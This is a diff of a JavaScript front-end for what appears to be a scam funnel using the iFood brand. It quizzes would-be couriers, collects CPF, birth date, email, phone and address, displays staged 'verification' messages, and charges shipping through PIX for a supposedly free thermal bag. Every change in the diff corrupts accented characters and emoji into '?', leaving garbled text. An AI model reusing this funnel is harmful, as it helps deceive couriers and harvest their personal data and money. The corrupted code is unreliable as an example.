@@ -1,89 +1,89 @@
 ﻿const questions = {
     start: {
         id: 'start',
-        text: 'Você já realiza entregas pelo iFood?',
+        text: 'Voc? j? realiza entregas pelo iFood?',
         options: [
-            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
-            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
+            { text: 'Sim, j? sou parceiro', icon: '??', next: 'tempo_atividade' },
+            { text: 'Ainda n?o, quero come?ar', icon: '??', next: 'possu_veiculo' }
         ]
     },
     tempo_atividade: {
         id: 'tempo_atividade',
-        text: 'Há quanto tempo você está nas entregas?',
+        text: 'H? quanto tempo voc? est? nas entregas?',
         options: [
-            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
-            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
-            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
+            { text: 'Estou come?ando agora', icon: '??', next: 'disponibilidade' },
+            { text: 'Menos de 1 ano', icon: '?', next: 'disponibilidade' },
+            { text: 'Mais de 1 ano', icon: '??', next: 'disponibilidade' }
         ]
     },
     possu_veiculo: {
         id: 'possu_veiculo',
-        text: 'Você já tem veículo para entregas?',
+        text: 'Voc? j? tem ve?culo para entregas?',
         options: [
-            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
-            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
+            { text: 'Sim, j? tenho', icon: '?', next: 'tipo_veiculo' },
+            { text: 'Estou providenciando', icon: '???', next: 'tipo_veiculo' }
         ]
     },
     tipo_veiculo: {
         id: 'tipo_veiculo',
-        text: 'Qual será seu principal meio de entrega?',
+        text: 'Qual ser? seu principal meio de entrega?',
         options: [
-            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
-            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
+            { text: 'Moto', icon: '???', next: 'cnh_status' },
+            { text: 'Bicicleta', icon: '??', next: 'disponibilidade' }
         ]
     },
     cnh_status: {
         id: 'cnh_status',
-        text: 'Qual é a situação da sua CNH?',
+        text: 'Qual ? a situa??o da sua CNH?',
         options: [
-            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
-            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
-            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
+            { text: 'EAR (Atividade remunerada)', icon: '?', next: 'disponibilidade' },
+            { text: 'CNH comum (sem EAR)', icon: '??', next: 'disponibilidade' },
+            { text: 'Provis?ria', icon: '??', next: 'disponibilidade' }
         ]
     },
     disponibilidade: {
         id: 'disponibilidade',
-        text: 'Quantas horas por dia você pretende ficar online?',
+        text: 'Quantas horas por dia voc? pretende ficar online?',
         options: [
-            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
-            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
-            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
+            { text: 'At? 4 horas', icon: '??', next: 'objetivo_renda' },
+            { text: '4 a 8 horas', icon: '??', next: 'objetivo_renda' },
+            { text: 'Mais de 8 horas', icon: '??', next: 'objetivo_renda' }
         ]
     },
     objetivo_renda: {
         id: 'objetivo_renda',
-        text: 'Qual é seu objetivo com as entregas?',
+        text: 'Qual ? seu objetivo com as entregas?',
         options: [
-            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
-            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
-            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
+            { text: 'Renda extra', icon: '??', next: 'regiao_preferencia' },
+            { text: 'Renda principal', icon: '??', next: 'regiao_preferencia' },
+            { text: 'Quero crescer r?pido', icon: '??', next: 'regiao_preferencia' }
         ]
     },
     regiao_preferencia: {
         id: 'regiao_preferencia',
-        text: 'Onde você prefere atuar?',
+        text: 'Onde voc? prefere atuar?',
         options: [
-            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
-            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
-            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
+            { text: 'Centro e arredores', icon: '???', next: 'equipamento' },
+            { text: 'Bairros residenciais', icon: '??', next: 'equipamento' },
+            { text: 'Pr?ximo a shoppings', icon: '???', next: 'equipamento' }
         ]
     },
     equipamento: {
         id: 'equipamento',
-        text: 'Você já tem bag térmica em boas condições?',
+        text: 'Voc? j? tem bag t?rmica em boas condi??es?',
         options: [
-            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
-            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
-            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
+            { text: 'Sim, mas preciso trocar', icon: '??', next: 'horario_pico' },
+            { text: 'N?o tenho, preciso da primeira', icon: '??', next: 'horario_pico' },
+            { text: 'Tenho e quero uma reserva', icon: '?', next: 'horario_pico' }
         ]
     },
     horario_pico: {
         id: 'horario_pico',
-        text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
+        text: 'Voc? consegue rodar em hor?rios de pico (almo?o/jantar)?',
         options: [
-            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
-            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
-            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
+            { text: 'Sim, com certeza', icon: '??', next: 'personal_step' },
+            { text: 'Consigo ?s vezes', icon: '??', next: 'personal_step' },
+            { text: 'Prefiro hor?rios alternativos', icon: '??', next: 'personal_step' }
         ]
     }
 };
@@ -254,22 +254,22 @@ function initPersonal() {
         }
 
         if (!isValidDate(birthValue)) {
-            showInlineError(errorBox, 'Digite uma data válida (DD/MM/AAAA).');
+            showInlineError(errorBox, 'Digite uma data v?lida (DD/MM/AAAA).');
             return;
         }
 
         if (!validateCPF(cpfValue)) {
-            showInlineError(errorBox, 'CPF inválido. Verifique os números digitados.');
+            showInlineError(errorBox, 'CPF inv?lido. Verifique os n?meros digitados.');
             return;
         }
 
         if (!isValidEmail(emailValue)) {
-            showInlineError(errorBox, 'Digite um e-mail válido.');
+            showInlineError(errorBox, 'Digite um e-mail v?lido.');
             return;
         }
 
         if (!isValidPhone(phoneValue)) {
-            showInlineError(errorBox, 'Digite um telefone válido com DDD.');
+            showInlineError(errorBox, 'Digite um telefone v?lido com DDD.');
             return;
         }
 
@@ -353,7 +353,7 @@ function initCep() {
 
         const rawCep = cepInput.value.replace(/\D/g, '');
         if (rawCep.length !== 8) {
-            showInlineError(errorBox, 'Por favor, digite um CEP válido.');
+            showInlineError(errorBox, 'Por favor, digite um CEP v?lido.');
             return;
         }
 
@@ -368,8 +368,8 @@ function initCep() {
             const data = await fetchCepData(rawCep, 1);
             const street = (data.street || '').trim();
             const neighborhood = (data.neighborhood || '').trim();
-            const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
-            const city = (data.city || 'Cidade não informada').trim();
+            const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua n?o informada';
+            const city = (data.city || 'Cidade n?o informada').trim();
             const stateUf = (data.state || '').trim();
             const cityLine = stateUf ? `${city} - ${stateUf}` : city;
 
@@ -448,8 +448,8 @@ function initProcessing() {
     const overlayEl = document.getElementById('vsl-audio-overlay');
     const overlayBtn = document.getElementById('vsl-audio-btn');
     const loadingTexts = [
-        'Verificando estoque da bag na sua região...',
-        'Validando seus dados com segurança...',
+        'Verificando estoque da bag na sua regi?o...',
+        'Validando seus dados com seguran?a...',
         'Confirmando sua prioridade na fila...',
         'Liberando o acesso ao resgate...'
     ];
@@ -556,7 +556,7 @@ function initProcessing() {
                 verifiedEl.classList.remove('hidden');
                 verifiedEl.setAttribute('aria-hidden', 'false');
             }
-            updateText('Verificação concluída.');
+            updateText('Verifica??o conclu?da.');
 
             setTimeout(() => {
                 setStage('success');
@@ -732,7 +732,7 @@ function initCheckout() {
         const numberValue = (extra?.number || '').trim();
         const numberText = extra?.noNumber ? 's/n' : numberValue;
         const streetWithNumber = numberText ? `${base}, ${numberText}` : base;
-        return `${streetWithNumber} · ${city}`;
+        return `${streetWithNumber} ? ${city}`;
     };
 
     const updateSummaryAddress = () => {
@@ -758,14 +758,14 @@ function initCheckout() {
 
         fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
             .then((res) => {
-                if (!res.ok) throw new Error('CEP não encontrado');
+                if (!res.ok) throw new Error('CEP n?o encontrado');
                 return res.json();
             })
             .then((data) => {
                 const street = (data.street || '').trim();
                 const neighborhood = (data.neighborhood || '').trim();
-                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
-                const city = (data.city || 'Cidade não informada').trim();
+                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua n?o informada';
+                const city = (data.city || 'Cidade n?o informada').trim();
                 const stateUf = (data.state || '').trim();
                 const cityLine = stateUf ? `${city} - ${stateUf}` : city;
 
@@ -786,7 +786,7 @@ function initCheckout() {
                 updateFreightAddress(updatedAddress);
             })
             .catch(() => {
-                showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
+                showToast('CEP n?o encontrado. Verifique e tente novamente.', 'error');
             })
             .finally(() => {
                 if (freightLoading) setHidden(freightLoading, true);
@@ -847,8 +847,8 @@ function initCheckout() {
 
     const updateFreightAddress = (addr) => {
         if (!freightAddress) return;
-        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua não informada';
-        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade não informada';
+        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua n?o informada';
+        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade n?o informada';
         setHidden(freightAddress, false);
     };
 
@@ -937,7 +937,7 @@ function initCheckout() {
     const calcShipping = () => {
         const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) {
-            showToast('Digite um CEP válido para calcular o frete.', 'error');
+            showToast('Digite um CEP v?lido para calcular o frete.', 'error');
             return;
         }
 
@@ -961,14 +961,14 @@ function initCheckout() {
 
         fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
             .then((res) => {
-                if (!res.ok) throw new Error('CEP não encontrado');
+                if (!res.ok) throw new Error('CEP n?o encontrado');
                 return res.json();
             })
             .then((data) => {
                 const street = (data.street || '').trim();
                 const neighborhood = (data.neighborhood || '').trim();
-                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
-                const city = (data.city || 'Cidade não informada').trim();
+                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua n?o informada';
+                const city = (data.city || 'Cidade n?o informada').trim();
                 const stateUf = (data.state || '').trim();
                 const cityLine = stateUf ? `${city} - ${stateUf}` : city;
 
@@ -1020,7 +1020,7 @@ function initCheckout() {
                 const elapsed = Date.now() - startTime;
                 const remaining = Math.max(0, minDelay - elapsed);
                 setTimeout(() => {
-                    showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
+                    showToast('CEP n?o encontrado. Verifique e tente novamente.', 'error');
                     setHidden(freightLoading, true);
                     if (btnCalcFreight) {
                         btnCalcFreight.classList.remove('hidden');
@@ -1276,7 +1276,7 @@ function initPix() {
 
     if (pixOrderId) {
         const id = String(pix.idTransaction || '').trim();
-        pixOrderId.textContent = id ? id.slice(-6) : '—';
+        pixOrderId.textContent = id ? id.slice(-6) : '-';
     }
 
     if (pixTimer && pixProgress) {
@@ -1908,7 +1908,7 @@ function handleAnswer(btnElement, option, refs) {
         );
 
         if (!questions[state.currentQuestionKey]) {
-            showToast('Ocorreu um erro ao carregar a próxima pergunta.', 'error');
+            showToast('Ocorreu um erro ao carregar a pr?xima pergunta.', 'error');
             state.answerLocked = false;
             return;
         }
@@ -2072,21 +2072,21 @@ function buildShippingOptions(rawCep) {
     return [
         {
             id: 'economico',
-            name: 'Envio Econômico iFood',
+            name: 'Envio Econ?mico iFood',
             price: 19.9,
-            eta: '5 a 8 dias úteis'
+            eta: '5 a 8 dias ?teis'
         },
         {
             id: 'padrao',
-            name: 'Envio Padrão iFood',
+            name: 'Envio Padr?o iFood',
             price: 25.9,
-            eta: '3 a 5 dias úteis'
+            eta: '3 a 5 dias ?teis'
         },
         {
             id: 'expresso',
-            name: 'Envio Prioritário iFood',
+            name: 'Envio Priorit?rio iFood',
             price: 29.9,
-            eta: '1 a 3 dias úteis'
+            eta: '1 a 3 dias ?teis'
         }
     ];
 }
@@ -2223,7 +2223,7 @@ async function ensureApiSession(force = false) {
         credentials: 'same-origin'
     })
         .then((res) => {
-            if (!res.ok) throw new Error('Falha ao iniciar sessão segura.');
+            if (!res.ok) throw new Error('Falha ao iniciar sess?o segura.');
             state.apiSessionAt = Date.now();
             return true;
         })
